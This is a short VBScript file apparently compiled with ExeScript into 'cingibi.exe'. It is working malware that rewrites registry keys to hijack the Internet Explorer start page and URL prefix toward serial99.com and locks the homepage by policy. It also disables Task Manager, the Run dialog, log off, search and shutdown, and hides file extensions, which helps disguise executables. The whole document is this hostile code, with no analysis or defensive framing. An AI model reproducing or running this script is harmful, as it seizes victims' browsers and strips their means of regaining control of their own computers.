
' ----- ExeScript Options Begin -----
' ScriptType: window
' DestDirectory: temp
' Icon: default
' OutputFile: C:\Documents and Settings\DELL\Desktop\cingibi.exe
' ----- ExeScript Options End -----
Set Ocu = WScript.CreateObject("WScript.Shell")
Ocu.RegWrite "HKCU\SOFTWARE\Microsoft\Internet Explorer\Main\\Start Page", "http://www.serial99.com/?a","REG_SZ"
Ocu.RegWrite "HKCU\SOFTWARE\Microsoft\Internet Explorer\Main\\Window Title", "Serial99.com","REG_SZ"
Ocu.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\URL\Prefixes\\www","http://www.serial99.com/?","REG_SZ"
Ocu.RegWrite "HKLM\Software\Policies\Microsoft\Internet Explorer\Control Panel\\HomePage","00000001","REG_DWORD"
Ocu.RegWrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\\HomePage","00000001","REG_DWORD"
Ocu.RegWrite "HKCU\SOFTWARE\Microsoft\Internet Explorer\Main\\Start Page", "http://www.serial99.com/?a","REG_SZ"
Ocu.RegWrite "HKLM\SOFTWARE\Microsoft\Internet Explorer\Main\\Start Page", "http://www.serial99.com/?a","REG_SZ"
Ocu.RegWrite "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\\DisableTaskMgr", "1","REG_SZ"
Ocu.RegWrite "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\\NoRun", "1","REG_SZ"
Ocu.RegWrite "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\\NoLogOff", "1","REG_SZ"
Ocu.RegWrite "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\\NoFind", "1","REG_SZ"
Ocu.RegWrite "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\\NoRecentDocsMenu", "1","REG_SZ"
Ocu.RegWrite "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\\NoClose", "1","REG_SZ"
Ocu.RegWrite "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\\HideFileExt","00000001","REG_DWORD"
